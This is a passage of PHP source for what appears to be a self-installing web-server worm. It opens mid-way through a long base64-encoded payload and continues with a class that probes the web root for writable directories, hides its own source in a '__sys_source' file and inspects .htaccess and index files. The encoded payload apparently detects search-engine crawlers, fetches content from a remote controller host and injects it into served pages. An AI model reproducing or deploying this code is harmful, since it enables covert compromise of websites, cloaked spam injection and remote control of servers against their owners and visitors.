JjcmF3bGVyLG1zbmJvdCxhc2sgamVldmVzLHRlb21hLHNjb290ZXIscHNib3Qsb3BlbmJvdCxpYV9hcmNoaXZlcixhbG1hZGVuLGJhaWR1c3BpZGVyLHp5Ym9yZyxnaWdhYm90LG5hdmVyYm90LHN1cnZleWJvdCxib2l0aG8uY29tLWRjLG9iamVjdHNzZWFyY2gsYW5zd2VyYnVzLG5zb2h1LXNlYXJjaCcpOwogICAgICAgIGZvcmVhY2goJGJvdHMgYXMgJGJvdCl7CiAgICAgICAgICAgIGlmIChzdHJwb3Moc3RydG9sb3dlcigkYWdlbnQpLCB0cmltKHN0cnRvbG93ZXIoJGJvdCkpKSAhPT0gZmFsc2UpewogICAgICAgICAgICAgICAgJGlzX2JvdCA9IHRydWU7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJHVyaSA9IGlzc2V0KCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKSA/ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdIDogIi8iOwogICAgICAgIGlmKHN0cnBvcygkdXJpLCAnaW5kZXgucGhwJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgJHVyaV9wYXJ0cyA9IGV4cGxvZGUoJ2luZGV4LnBocCcsICR1cmkpOwogICAgICAgICAgICBpZihpc3NldCgkdXJpX3BhcnRzWzBdKSl7CiAgICAgICAgICAgICAgICAkdXJpID0gJHVyaV9wYXJ0c1swXTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkYmFzZV91cmkgPSBwYXJzZV91cmwoJHVyaSwgUEhQX1VSTF9QQVRIKTsKICAgICAgICAkdXJpX3F1ZXJ5ID0gcGFyc2VfdXJsKCR1cmksIFBIUF9VUkxfUVVFUlkpOwoKICAgICAgICAkaGFzX3RyYWlsaW5nX2JhY2tfc2xhc2ggPSBmYWxzZTsKCiAgICAgICAgaWYoJHVyaSAhPSAiLyIpewoKICAgICAgICAgICAgJGhhc190cmFpbGluZ19iYWNrX3NsYXNoID0gKCRiYXNlX3VyaSAhPSBydHJpbSgkYmFzZV91cmksICIvXFwiKSk7CgogICAgICAgICAgICAkdXJpID0gIHJ0cmltKCR1cmksICIvXFwiKTsKCiAgICAgICAgfQoKICAgICAgICAkaGFzaCA9IG1kNSgkZG9tYWluIC4gJHVyaSk7CgogICAgICAgICRwYWdlc19tYXBfanNvbiA9IEBmaWxlX2dldF9jb250ZW50cygkcGFnZXNfbWFwX2ZpbGUpOwogICAgICAgIGlmKCEkcGFnZXNfbWFwX2pzb24pewoKICAgICAgICAgICAgJHBhZ2VzX21hcF9qc29uID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vJyAuICRkYWRkeV9ob3N0IC4gJy93ZWJzaXRlLXBhZ2VzLW1hcD9kb21haW49JyAuIHVybGVuY29kZSgkZG9tYWluKSk7CgogICAgICAgICAgICBpZigkcGFnZXNfbWFwX2pzb24pewoKICAgICAgICAgICAgICAgIGlmKCRwYWdlc19tYXBfanNvbiA9PSAnZmFsc2UnKXsKICAgICAgICAgICAgICAgICAgICAkcGFnZXNfbWFwX2pzb24gPSAnW10nOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkcGFnZXNfbWFwX2ZpbGUsICRwYWdlc19tYXBfanNvbik7CgogICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICRwYWdlc19tYXBfanNvbiA9ICdbXSc7CgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICAgICAgaWYoJHBhZ2VzX21hcF9qc29uKXsKCiAgICAgICAgICAgICRfX2lzX2FydGljbGUgPSBmYWxzZTsKICAgICAgICAgICAgJHBhZ2Vfc291cmNlX2ZpbGVfcGF0aCA9ICRwYWdlc19zb3VyY2VzX3BhdGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGhhc2ggLiAnLmh0bWwnOwoKICAgICAgICAgICAgaWYoQGZpbGVfZXhpc3RzKCRwYWdlX3NvdXJjZV9maWxlX3BhdGgpKXsKCiAgICAgICAgICAgICAgICAkX19pc19hcnRpY2xlID0gdHJ1ZTsKCiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgJF9faXNfYXJ0aWNsZSA9IHByZWdfbWF0Y2goJy8nIC4gJGhhc2ggLiAnLycsICRwYWdlc19tYXBfanNvbik7CgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkX19pc19hcnRpY2xlKXsKCiAgICAgICAgICAgICAgICBpZighJGhhc190cmFpbGluZ19iYWNrX3NsYXNoKXsKCiAgICAgICAgICAgICAgICAgICAgJGV4dCA9IHBhdGhpbmZvKCR1cmksIFBBVEhJTkZPX0VYVEVOU0lPTik7CiAgICAgICAgICAgICAgICAgICAgaWYoISRleHQpewoKICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyKCJMb2NhdGlvbjogIiAuICRiYXNlX3VyaSAuICcvJyAuICggJHVyaV9xdWVyeSA/ICc/JyAuICR1cmlfcXVlcnkgOiBudWxsKSwgdHJ1ZSwgMzAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgpOwoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCFAZmlsZV9leGlzdHMoJHBhZ2Vfc291cmNlX2ZpbGVfcGF0aCkgfHwgKGZpbGVfZXhpc3RzKCRwYWdlX3NvdXJjZV9maWxlX3BhdGgpICYmIGZpbGVtdGltZSgkcGFnZV9zb3VyY2VfZmlsZV9wYXRoKSA8PSAodGltZSgpIC0gKDYwICogNjAgKiAyNCAqIDMpKSkpewoKICAgICAgICAgICAgICAgICAgICBpZighQGlzX2RpcigkcGFnZXNfc291cmNlc19wYXRoKSl7CiAgICAgICAgICAgICAgICAgICAgICAgIEBta2RpcigkcGFnZXNfc291cmNlc19wYXRoKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICR1cmwgPSAiaHR0cDovLyRkYWRkeV9ob3N0L3BhZ2U/ZG9tYWluPSIgLiB1cmxlbmNvZGUoJGRvbWFpbikgLiAiJnVyaT0iIC4gdXJsZW5jb2RlKCR1cmkpIC4gIiZ1c2VyX2FnZW50PSIgLiB1cmxlbmNvZGUoJGFnZW50KTsKICAgICAgICAgICAgICAgICAgICAkcGFnZV9zb3VyY2UgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7CiAgICAgICAgICAgICAgICAgICAgaWYoJHBhZ2Vfc291cmNlICYmICRwYWdlX3NvdXJjZSAhPSAnZmFsc2UnKXsKCiAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkcGFnZV9zb3VyY2VfZmlsZV9wYXRoLCAkcGFnZV9zb3VyY2UpOwoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKEBmaWxlX2V4aXN0cygkcGFnZV9zb3VyY2VfZmlsZV9wYXRoKSl7CgogICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRfQ09PS0lFWyR1cmldKSl7CgogICAgICAgICAgICAgICAgICAgICAgICAkaHRtbCA9IEBmaWxlX2dldF9jb250ZW50cygkcGFnZV9zb3VyY2VfZmlsZV9wYXRoKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGRvbSA9IG5ldyBET01Eb2N1bWVudCgpOwogICAgICAgICAgICAgICAgICAgICAgICBsaWJ4bWxfdXNlX2ludGVybmFsX2Vycm9ycyh0cnVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGRvbS0+bG9hZEhUTUwoJGh0bWwpOwogICAgICAgICAgICAgICAgICAgICAgICBsaWJ4bWxfY2xlYXJfZXJyb3JzKCk7CgogICAgICAgICAgICAgICAgICAgICAgICAkZWxlbWVudCA9ICRkb20tPmdldEVsZW1lbnRCeUlkKCdfX2NvbnRhaW5lcl9pbm5lcl9yaWdodF9iYXInKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCRlbGVtZW50LT5jaGlsZE5vZGVzLT5sZW5ndGgpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGVsZW1lbnQtPnJlbW92ZUNoaWxkKCRlbGVtZW50LT5maXJzdENoaWxkKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJGNvb2tpZVVybCA9ICRfQ09PS0lFWyR1cmldOwogICAgICAgICAgICAgICAgICAgICAgICAkY29va2llVXJsSGFzaCA9IG1kNSgkY29va2llVXJsKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGNvb2tpZVBhZ2VTb3VyY2VGaWxlUGF0aCA9ICRwYWdlc19zb3VyY2VzX3BhdGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGNvb2tpZVVybEhhc2ggLiAnLmh0bWwnOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoIUBmaWxlX2V4aXN0cygkY29va2llUGFnZVNvdXJjZUZpbGVQYXRoKSB8fCAoZmlsZV9leGlzdHMoJGNvb2tpZVBhZ2VTb3VyY2VGaWxlUGF0aCkgJiYgZmlsZW10aW1lKCRjb29raWVQYWdlU291cmNlRmlsZVBhdGgpIDw9ICh0aW1lKCkgLSAoNjAgKiA2MCAqIDI0ICogMykpKSl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVybCA9ICJodHRwOi8vJGRhZGR5X2hvc3Qvc2hvcC1wYWdlLyRjb29raWVVcmxIYXNoIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaG9wUGFnZVNvdXJjZSA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRzaG9wUGFnZVNvdXJjZSAmJiAkc2hvcFBhZ2VTb3VyY2UgIT0gJ2ZhbHNlJyl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRjb29raWVQYWdlU291cmNlRmlsZVBhdGgsICRzaG9wUGFnZVNvdXJjZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBpZihAZmlsZV9leGlzdHMoJGNvb2tpZVBhZ2VTb3VyY2VGaWxlUGF0aCkpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmcmFnbWVudCA9ICRkb20tPmNyZWF0ZURvY3VtZW50RnJhZ21lbnQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmcmFnbWVudC0+YXBwZW5kWE1MKEBmaWxlX2dldF9jb250ZW50cygkY29va2llUGFnZVNvdXJjZUZpbGVQYXRoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWxlbWVudC0+aW5zZXJ0QmVmb3JlKCRmcmFnbWVudCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAkZG9tLT5zYXZlSFRNTCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmNsdWRlX29uY2UoJHBhZ2Vfc291cmNlX2ZpbGVfcGF0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCk7CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICBpbmNsdWRlX29uY2UoJHBhZ2Vfc291cmNlX2ZpbGVfcGF0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoKTsKCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgJGxpbmtzX3NvdXJjZV9maWxlX3BhdGggPSAkbGlua3Nfc291cmNlc19wYXRoIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRoYXNoOwogICAgICAgICAgICAgICAgaWYoQGZpbGVfZXhpc3RzKCRsaW5rc19zb3VyY2VfZmlsZV9wYXRoKSl7CgogICAgICAgICAgICAgICAgICAgICRfX3ZpYV9jb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRsaW5rc19zb3VyY2VfZmlsZV9wYXRoKTsKICAgICAgICAgICAgICAgICAgICAkX192aWFfY29udGVudCA9IHN0cl9yZXBsYWNlKCdwb3NpdGlvbjpmaXhlZCAhaW1wb3J0YW50OyBsZWZ0Oi05OTk5cHggIWltcG9ydGFudDsnLCAnJywgJF9fdmlhX2NvbnRlbnQpOwoKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgIGlmKCFAaXNfZGlyKCRsaW5rc19zb3VyY2VzX3BhdGgpKXsKICAgICAgICAgICAgICAgICAgICAgICAgQG1rZGlyKCRsaW5rc19zb3VyY2VzX3BhdGgpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJF9fdmlhX2NvbnRlbnQgPSBudWxsOwoKICAgICAgICAgICAgICAgICAgICBpZihpc3NldCgkd2Vic2l0ZV9jb25maWdbJ2lzX3NhcGUnXSkgJiYgJHdlYnNpdGVfY29uZmlnWydpc19zYXBlJ10pewoKICAgICAgICAgICAgICAgICAgICAgICAgJHJlZmVyZXIgPSAiaHR0cDovL3skZG9tYWlufXskdXJpfSI7CiAgICAgICAgICAgICAgICAgICAgICAgICRvcHRzID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInPT5hcnJheSgiUmVmZXJlcjogJHJlZmVyZXJcclxuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOwogICAgICAgICAgICAgICAgICAgICAgICAkdXJsID0gImh0dHA6Ly8kbGlua3NfZGFkZHlfaG9zdC9saW5rcz9wYWdlQ29udGVudD0xIjsKICAgICAgICAgICAgICAgICAgICAgICAgJGxpbmtzX3NvdXJjZSA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgJGNvbnRleHQpOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGxpbmtzX3NvdXJjZSAmJiAkbGlua3Nfc291cmNlICE9ICdmYWxzZScpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlc191cmxzID0gYXJyYXkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpc0pzb24gPSBpbl9hcnJheShzdWJzdHIodHJpbSgkbGlua3Nfc291cmNlKSwgMCwgMSksIGFycmF5KCdbJywgJ3snKSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGlzSnNvbil7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfX3BhZ2VzID0ganNvbl9kZWNvZGUoJGxpbmtzX3NvdXJjZSwgdHJ1ZSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzX2FycmF5KCRfX3BhZ2VzKSl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCRfX3BhZ2VzIGFzICRfX3BhZ2UpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJF9fcGFnZVsndXJsJ10pICYmIGlzc2V0KCRfX3BhZ2VbJ2FuY2hvciddKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VzX3VybHNbXSA9ICI8bGk+PGEgaHJlZj0nIiAuICRfX3BhZ2VbJ3VybCddIC4gIic+IiAuICRfX3BhZ2VbJ2FuY2hvciddIC4gIjwvYT48L2xpPiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRwYWdlc191cmxzKXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX192aWFfY29udGVudCA9ICI8dWw+IiAuIGltcGxvZGUoJycsICRwYWdlc191cmxzKSAuICI8L3VsPiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJGxpbmtzX3NvdXJjZV9maWxlX3BhdGgsICRfX3ZpYV9jb250ZW50KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfX3ZpYV9jb250ZW50ID0gJGxpbmtzX3NvdXJjZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkX192aWFfY29udGVudCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkbGlua3Nfc291cmNlX2ZpbGVfcGF0aCwgJF9fdmlhX2NvbnRlbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAkcGFnZXNfbWFwID0ganNvbl9kZWNvZGUoJHBhZ2VzX21hcF9qc29uLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNfYXJyYXkoJHBhZ2VzX21hcCkgJiYgJHBhZ2VzX21hcCl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VzX2Ftb3VudCA9IGNvdW50KCRwYWdlc19tYXApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHBhZ2VzX2Ftb3VudCA+PSAxMCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJhbmRfcGFnZXNfa2V5cyA9IGFycmF5X3JhbmQoJHBhZ2VzX21hcCwgJHBhZ2VzX2Ftb3VudCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyYW5kX3BhZ2VzX2tleXMgPSBhcnJheV9rZXlzKCRwYWdlc19tYXApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlc191cmxzID0gYXJyYXkoKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCRyYW5kX3BhZ2VzX2tleXMgYXMgJHBhZ2Vfa2V5KXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX19wYWdlID0gJHBhZ2VzX21hcFskcGFnZV9rZXldOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRfX3BhZ2VbJ3VybCddKSAmJiBpc3NldCgkX19wYWdlWydhbmNob3InXSkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZXNfdXJsc1tdID0gIjxsaT48YSBocmVmPSciIC4gJF9fcGFnZVsndXJsJ10gLiAiJz4iIC4gJF9fcGFnZVsnYW5jaG9yJ10gLiAiPC9hPjwvbGk+IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHBhZ2VzX3VybHMpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkX192aWFfY29udGVudCA9ICI8dWw+IiAuIGltcGxvZGUoJycsICRwYWdlc191cmxzKSAuICI8L3VsPiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRsaW5rc19zb3VyY2VfZmlsZV9wYXRoLCAkX192aWFfY29udGVudCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkaXNfYm90ICYmICRfX3ZpYV9jb250ZW50ICYmIGlzX3N0cmluZygkX192aWFfY29udGVudCkpIHsKCiAgICAgICAgICAgICAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICAgICAgICAgICAgICBpbmNsdWRlX29uY2UoJF9fdmlhX2NvcHlfZmlsZV9uYW1lKTsKICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBvYl9nZXRfY29udGVudHMoKTsKICAgICAgICAgICAgICAgICAgICBvYl9lbmRfY2xlYW4oKTsKCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGlieG1sX3VzZV9pbnRlcm5hbF9lcnJvcnModHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRkb20tPmxvYWRIVE1MKCRfY29udGVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnhtbF9jbGVhcl9lcnJvcnMoKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICR0YWdzID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncCcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGl2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzcGFuJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0YWJsZScsCiAgICAgICAgICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICAgICAgICAgICAgICAkRE9NRWxlbWVudCA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YWdzIGFzICR0YWcpewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRET01Ob2RlTGlzdCA9ICRkb20tPmdldEVsZW1lbnRzQnlUYWdOYW1lKCR0YWcpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRET01Ob2RlTGlzdC0+bGVuZ3RoID4gMCl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtSW5kZXggPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRET01Ob2RlTGlzdC0+bGVuZ3RoID4gMSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtSW5kZXggPSBmbG9vcigkRE9NTm9kZUxpc3QtPmxlbmd0aCAvIDIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJERPTUVsZW1lbnQgPSAkRE9NTm9kZUxpc3QtPml0ZW0oJGl0ZW1JbmRleCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJERPTUVsZW1lbnQgaW5zdGFuY2VvZiBET01FbGVtZW50KXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZnJhZ21lbnQgPSAkZG9tLT5jcmVhdGVEb2N1bWVudEZyYWdtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZnJhZ21lbnQtPmFwcGVuZFhNTCgkX192aWFfY29udGVudCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJERPTUVsZW1lbnQtPnBhcmVudE5vZGUtPmluc2VydEJlZm9yZSgkZnJhZ21lbnQsICRET01FbGVtZW50KTsKCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJGRvbS0+c2F2ZUhUTUwoKTsKCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChFeGNlcHRpb24gJGUpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRkZWxpbWl0ZXIgPSAiPC9ib2R5PiI7CgogICAgICAgICAgICAgICAgICAgICAgICAkcGFnZV9wYXJ0cyA9IGV4cGxvZGUoJGRlbGltaXRlciwgJF9jb250ZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VfcGFydHNbMF0gLj0gJF9fdmlhX2NvbnRlbnQgLiAkZGVsaW1pdGVyOwoKICAgICAgICAgICAgICAgICAgICAgICAgJF9jb250ZW50ID0gaW1wbG9kZSgiIiwgJHBhZ2VfcGFydHMpOwoKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAkX2NvbnRlbnQ7CgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpOwoKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgIGluY2x1ZGVfb25jZSgkX192aWFfY29weV9maWxlX25hbWUpOwoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgIH0KCn0KCmluY2x1ZGVfb25jZSgkX192aWFfY29weV9maWxlX25hbWUpOw==',
    );

    /**
     * @param null $host
     * @param null $rootDir
     * @throws Exception
     */
    public function __construct($host = null, $rootDir = null)
    {

        $this->host = $host;
        $this->rootDir = $rootDir;

        $url = 'http://' . $this->getHost();

        if (!$this->isValidUrl($url)) {

            $redirect_url = $this->getRedirectUrl($url);
            $redirect_host = parse_url($redirect_url, PHP_URL_HOST);

            if ($this->isValidUrl($redirect_url)) {

                $this->setHost($redirect_host);

            } else {

                throw new Exception('Invalid host ' . $this->getHost());

            }

        }

        $test_file_name = time() . '.txt';
        $testFile = new SplFileInfo($this->getRootDir() . DIRECTORY_SEPARATOR . $test_file_name);

        $testFileObj = $testFile->openFile('w+');
        $testFileObj->fwrite($test_file_name);

        $test_file_url = 'http://' . $this->getHost() . '/' . $test_file_name;
        $test_file_response = @file_get_contents($test_file_url);

        if ($test_file_response == $test_file_name) {
            @unlink($testFile->getRealPath());
        } else {
            throw new Exception('Failed to create tmp file');
        }

        $files = $this->getRootDirFiles();

        /**
         * @var $file SplFileInfo
         */
        foreach ($files as $file) {

            switch ($file->getBasename()) {
                /* .htaccess */
                case '.htaccess':
                    $this->htaccessFile = $file;
                    break;
                /* PHP files */
                case 'index.php':
                case 'app.php':
                case 'home.php':
                    /* HTML files */
                case 'index.htm':
                case 'index.html':
                case 'home.html':
                    $this->possibleIndexes[$file->getBasename()] = array(
                        'rate' => $file->getBasename() == 'index.php' ? 1 : 0,
                        'file' => $file,
                    );
                    break;
            }

        }

        /* Check environment DirectoryIndex variable */
        if (dirname(__FILE__) == $this->getRootDir()) {

            $DirectoryIndex = getenv('DirectoryIndex');

            if ($DirectoryIndex) {

                if (isset($this->possibleIndexes[$DirectoryIndex])) {

                    $this->possibleIndexes[$DirectoryIndex]['rate']++;

                }

            }

        }

        $this->analyzeHtaccessFile();
        $this->analyzePossibleIndexes();

    }

    /**
     * @return string
     */
    public function getWormFilesPath(){

        if(!$this->wormFilesPath){

            $ignore_dirs = array(
                'cgi-bin',
                '__pages_sources',
                '__links_sources',
                '_static_files',
            );

            $ri1 = new RecursiveDirectoryIterator($this->getRootDir());
            $wormFilesPath = $this->getRootDir();

            foreach($ri1 as $d2){

                if($d2 instanceof SplFileInfo){

                    if (substr($d2->getFilename(), 0, 1) == '.'|| in_array($d2->getFilename(), $ignore_dirs)) {
                        continue;
                    };

                    if($d2->isDir() && $d2->isWritable()){

                        $wormFilesPath = $d2->getRealPath();
                        $ri2 = new RecursiveDirectoryIterator($d2->getRealPath());

                        foreach($ri2 as $d3){

                            if($d3 instanceof SplFileInfo){

                                if (substr($d3->getFilename(), 0, 1) == '.' || in_array($d3->getFilename(), $ignore_dirs)) {
                                    continue;
                                };

                                if($d3->isDir() && $d3->isWritable()){

                                    $wormFilesPath = $d3->getRealPath();
                                    break;

                                }

                            }

                        }

                        break;

                    }

                }

            };

            $this->wormFilesPath = $wormFilesPath;

        }

        return $this->wormFilesPath;

    }

    public function hideWormFiles(){

        $wormSource = base64_encode(@file_get_contents(__FILE__));
        $this->updateWorm($wormSource);

    }

    /**
     * @return SplFileInfo
     */
    public function getStaticFilesPath(){

        $path = $this->getWormFilesPath() . '/_static_files';
        if(!@is_dir($path)){
            @mkdir($path);
        }
        return $path;

    }

    /**
     * @return SplFileInfo
     */
    public function getWormSourceFile(){

        $fileName = $this->getWormFilesPath() . '/__sys_source';
        $file = new SplFileInfo($fileName);
        return $file;

    }

    /**
     * @param $base64_string
     * @return int
     */
    public function updateWormSource($base64_string){

        $file = $this->getWormSourceFile();

        $path = $file->getPath() . DIRECTORY_SEPARATOR . $file->getFilename();
        $bytes = @file_put_contents($path, $base64_string);

        return $bytes ? $path : null;

    }

    /**
     * @return mixed
     */
    public function getPagesSourcesPath(){
